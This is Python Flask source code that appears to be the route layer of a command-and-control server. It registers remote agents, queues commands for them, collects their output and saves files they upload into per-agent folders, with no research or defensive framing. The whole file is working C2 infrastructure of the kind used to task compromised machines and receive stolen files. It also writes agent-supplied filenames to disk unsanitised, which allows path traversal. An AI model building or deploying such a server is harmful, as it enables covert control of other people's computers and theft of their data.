import time
import json
import base64
import os
import platform
from queue import Queue
from flask import request, jsonify
from lib.config import agents, tasks, results, AUTH_KEY, AGENT_TIMEOUT

# Helper functions
def auth_check(req):
    return req.headers.get("Authorization") == f"Bearer {AUTH_KEY}"

def timestamp():
    import time
    return time.strftime("%Y-%m-%d %H:%M:%S")

def save_file(agent_id, filename, b64data):
    data = base64.b64decode(b64data)

    system = platform.system()
    if system == "Windows":
        downloads_dir = os.path.join(os.environ['USERPROFILE'], "Downloads")
    else:
        downloads_dir = os.path.expanduser("~/Downloads")

    agent_dir = os.path.join(downloads_dir, agent_id)
    os.makedirs(agent_dir, exist_ok=True)
    filepath = os.path.join(agent_dir, filename)

    with open(filepath, "wb") as f:
        f.write(data)

    return filepath

# Routes
def create_routes(app):

    @app.route("/register", methods=["POST"])
    def register():
        if not auth_check(request):
            return "Unauthorized", 401

        import uuid
        agent_id = str(uuid.uuid4())
        agents[agent_id] = {
            "registered_at": timestamp(),
            "last_seen": time.time()
        }
        tasks[agent_id] = Queue()
        results[agent_id] = []

        return jsonify({"agent_id": agent_id})

    @app.route("/task/<agent_id>", methods=["GET"])
    def get_task(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401

        if agent_id not in agents:
            return "Unknown agent", 404

        agents[agent_id]["last_seen"] = time.time()

        if not tasks[agent_id].empty():
            return jsonify({"task": tasks[agent_id].get()})
        return jsonify({"task": None})

    @app.route("/task/<agent_id>", methods=["POST"])
    def send_task(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401
        if agent_id not in agents:
            return "Unknown agent", 404

        if time.time() - agents[agent_id]["last_seen"] > AGENT_TIMEOUT:
            return "Agent offline", 400

        task = request.data.decode()
        tasks[agent_id].put(task)
        return "OK", 200

    @app.route("/result/<agent_id>", methods=["POST"])
    def receive_result(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401
        if agent_id not in agents:
            return "Unknown agent", 404

        content = request.data.decode()

        try:
            parsed = json.loads(content)
            if parsed.get("type") == "file":
                filename = parsed.get("filename", "output.bin")
                b64 = parsed.get("data", "")
                saved_path = save_file(agent_id, filename, b64)
                readable = f"[FILE SAVED] {saved_path}"
            else:
                readable = content
        except:
            readable = content

        results[agent_id].append({"timestamp": timestamp(), "result": readable})
        return "OK", 200

    @app.route("/agents", methods=["GET"])
    def list_agents():
        if not auth_check(request):
            return "Unauthorized", 401

        live_agents = [
            agent_id for agent_id, info in agents.items()
            if time.time() - info["last_seen"] <= AGENT_TIMEOUT
        ]
        return jsonify({"agents": live_agents})

    @app.route("/history/<agent_id>", methods=["GET"])
    def history(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401
        if agent_id not in agents:
            return "Unknown agent", 404

        return jsonify({"results": results[agent_id]})
